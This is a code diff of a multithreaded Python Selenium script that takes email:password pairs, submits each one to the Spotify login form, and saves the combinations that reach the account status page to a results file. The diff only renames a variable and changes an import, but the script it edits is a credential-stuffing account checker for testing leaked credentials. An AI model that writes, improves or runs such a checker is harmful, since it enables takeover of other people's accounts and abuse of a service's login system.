@@ -1,6 +1,6 @@
 import threading, time, datetime, os
 
-import selenium.webdriver as webdriver
+from selenium import webdriver
 from selenium.webdriver.common.by import By
 
 from colorama import Fore, Back
@@ -44,22 +44,22 @@ def check_account(account):
     
     CURRENT_THREADS += 1
     
-    browser = webdriver.Chrome(options=options)
-    browser.get(url)
-    browser.implicitly_wait(30)
+    driver = webdriver.Chrome(options=options)
+    driver.get(url)
+    driver.implicitly_wait(30)
 
     email, password = account.split(':')
 
     # login process
-    browser.find_element(By.CSS_SELECTOR, '#login-username').send_keys(email)
-    browser.find_element(By.CSS_SELECTOR, '#login-password').send_keys(password)
-    browser.find_element(By.CSS_SELECTOR, '#login-button').click()
+    driver.find_element(By.CSS_SELECTOR, '#login-username').send_keys(email)
+    driver.find_element(By.CSS_SELECTOR, '#login-password').send_keys(password)
+    driver.find_element(By.CSS_SELECTOR, '#login-button').click()
     # login process
 
     time.sleep(1.7)
 
     # valid
-    if browser.current_url == "https://accounts.spotify.com/pt-BR/status":
+    if driver.current_url == "https://accounts.spotify.com/pt-BR/status":
         print(f"{Fore.BLACK}{Back.GREEN}[VALID]{Back.RESET}{Fore.RESET} {email}:{password}")
 
         with open(RESULTS_FILE_NAME, 'a') as file:
@@ -67,7 +67,7 @@ def check_account(account):
         
         CURRENT_THREADS -= 1
         
-        browser.close()
+        driver.close()
         return
     
     # invalid
@@ -75,7 +75,7 @@ def check_account(account):
 
     time.sleep(0.5)
     CURRENT_THREADS -= 1
-    browser.close()
+    driver.close()
 
 
 print(f"Running {MAX_THREADS} threads...\n")
